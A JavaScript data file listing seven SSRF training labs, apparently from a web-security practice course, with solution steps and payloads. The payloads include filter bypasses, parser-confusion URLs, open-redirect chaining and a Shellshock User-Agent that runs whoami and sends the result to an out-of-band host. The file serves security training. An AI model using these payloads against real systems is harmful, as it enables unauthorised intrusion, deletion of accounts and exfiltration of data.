export const labs = [
  {
    id: 1,
    title: "Basic SSRF against the local server",
    level: "APPRENTICE",
    category: "LOCAL",
    objective: "Change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.",
    solution: [
      "Browse to /admin and observe that you can't directly access the admin page.",
      "Visit a product, click \"Check stock\", intercept the request in Burp Suite, and send it to Burp Repeater.",
      "Change the URL in the stockApi parameter to http://localhost/admin.",
      "Read the HTML to identify the URL to delete the target user.",
      "Submit the URL to deliver the SSRF attack."
    ],
    payloads: [
      { label: "Admin Access", value: "stockApi=http://localhost/admin" },
      { label: "Delete Carlos", value: "stockApi=http://localhost/admin/delete?username=carlos" }
    ]
  },
  {
    id: 2,
    title: "Basic SSRF against another back-end system",
    level: "APPRENTICE",
    category: "INTERNAL",
    objective: "Use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080.",
    solution: [
      "Visit a product, click Check stock, intercept the request in Burp Suite, and send it to Burp Intruder.",
      "Change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1) and click Add §.",
      "In the Payloads side panel, change the payload type to Numbers, and enter 1, 255, and 1 in the From and To and Step boxes respectively.",
      "Click Start attack.",
      "Click on the Status column to sort it by status code ascending. Click on the 200 request, send to Repeater.",
      "Change the path in the stockApi to: /admin/delete?username=carlos"
    ],
    payloads: [
      { label: "Intruder Scan", value: "stockApi=http://192.168.0.§1§:8080/admin" },
      { label: "Delete Carlos", value: "stockApi=http://[IP]:8080/admin/delete?username=carlos" }
    ]
  },
  {
    id: 3,
    title: "SSRF with blacklist-based input filter",
    level: "PRACTITIONER",
    category: "BLACKLIST",
    objective: "Change the stock check URL to access the admin interface at http://localhost/admin bypassing weak anti-SSRF defenses.",
    solution: [
      "Visit a product, intercept 'Check stock', send to Repeater.",
      "Change stockApi to http://127.0.0.1/ (blocked).",
      "Bypass the block by changing the URL to: http://127.1/",
      "Change the URL to http://127.1/admin (blocked again).",
      "Obfuscate the \"a\" by double-URL encoding it to %2561 to access the admin interface and delete the target user."
    ],
    payloads: [
      { label: "IP Bypass", value: "stockApi=http://127.1/" },
      { label: "Full Bypass", value: "stockApi=http://127.1/%2561dmin/delete?username=carlos" }
    ]
  },
  {
    id: 4,
    title: "SSRF with whitelist-based input filter",
    level: "PRACTITIONER",
    category: "WHITELIST",
    objective: "Bypass a whitelist-based anti-SSRF defense to access /admin and delete carlos.",
    solution: [
      "Change stockApi to http://127.0.0.1/ (blocked - whitelist validation).",
      "Change URL to http://username@[LAB-DOMAIN]/ (accepted - parser supports embedded credentials).",
      "Append a # to the username (rejected).",
      "Double-URL encode the # to %2523 (accepted - internal server error).",
      "Change URL to target localhost via parser confusion."
    ],
    payloads: [
      { label: "Parser Confusion", value: "stockApi=http://localhost:80%2523@[LAB-DOMAIN]/admin/delete?username=carlos" }
    ]
  },
  {
    id: 5,
    title: "SSRF with filter bypass via open redirection vulnerability",
    level: "PRACTITIONER",
    category: "OPEN REDIRECT",
    objective: "Find an open redirect affecting the application and use it to access http://192.168.0.12:8080/admin.",
    solution: [
      "Click 'next product' and observe that the path parameter is placed into the Location header resulting in open redirection.",
      "Create a URL exploiting open redirection routing to admin.",
      "Feed this into stockApi parameter.",
      "Amend the path to delete the target user."
    ],
    payloads: [
      { label: "Redirection Exploit", value: "stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos" }
    ]
  },
  {
    id: 6,
    title: "Blind SSRF with out-of-band detection",
    level: "PRACTITIONER",
    category: "BLIND",
    objective: "Use the analytics feature fetching Referer header to cause a request to Burp Collaborator.",
    solution: [
      "Visit a product, intercept, send to Repeater.",
      "Select Referer header, right-click, 'Insert Collaborator Payload'.",
      "Go to Collaborator tab, click 'Poll now'.",
      "Observe DNS and HTTP interactions."
    ],
    payloads: [
      { label: "Referer OAST", value: "Referer: http://[COLLABORATOR-ID].oastify.com" }
    ]
  },
  {
    id: 7,
    title: "Blind SSRF with Shellshock exploitation",
    level: "EXPERT",
    category: "SHELLSHOCK",
    objective: "Perform a blind SSRF against an internal server in 192.168.0.X:8080 and use Shellshock to exfiltrate OS user.",
    solution: [
      "Install Collaborator Everywhere extension in Burp Suite Professional, add domain to scope.",
      "Observe HTTP interaction contains User-Agent string.",
      "Send request to product page to Burp Intruder.",
      "Generate Collaborator payload, place into Shellshock payload in User-Agent.",
      "Change Referer to http://192.168.0.1:8080, add § to final octet.",
      "Set payload type to Numbers 1-255, Start attack.",
      "Check Collaborator for DNS interaction containing OS user."
    ],
    payloads: [
      { label: "Shellshock User-Agent", value: "User-Agent: () { :; }; /usr/bin/nslookup $(whoami).[COLLABORATOR-ID].oastify.com" },
      { label: "Intruder Referer Scan", value: "Referer: http://192.168.0.§1§:8080" }
    ]
  }
];
